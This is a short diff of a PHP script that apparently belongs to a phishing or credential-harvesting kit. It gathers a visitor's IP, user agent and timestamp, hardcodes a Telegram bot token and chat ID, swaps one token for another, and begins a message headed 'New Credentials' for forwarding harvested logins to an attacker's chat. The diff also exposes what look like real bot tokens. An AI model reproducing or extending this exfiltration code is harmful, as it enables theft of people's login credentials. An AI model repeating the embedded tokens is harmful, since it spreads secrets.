@@ -20,7 +20,7 @@ $ip = $input['ip'] ?? $_SERVER['REMOTE_ADDR'];
 $userAgent = $input['userAgent'] ?? $_SERVER['HTTP_USER_AGENT'];
 $timestamp = $input['timestamp'] ?? date('Y-m-d H:i:s');
 
-$botToken = '8349547391:AAH1v1zqalWhGluQiPUQ9RFNSVIu7xe_5Kw';
+$botToken = '8689377186:AAF8D6cJQkSjdpUbInbcLIeec84-AykR0mg';
 $chatId = '5358329332';
 
 $message = "🔐 New Credentials 🔐\n";
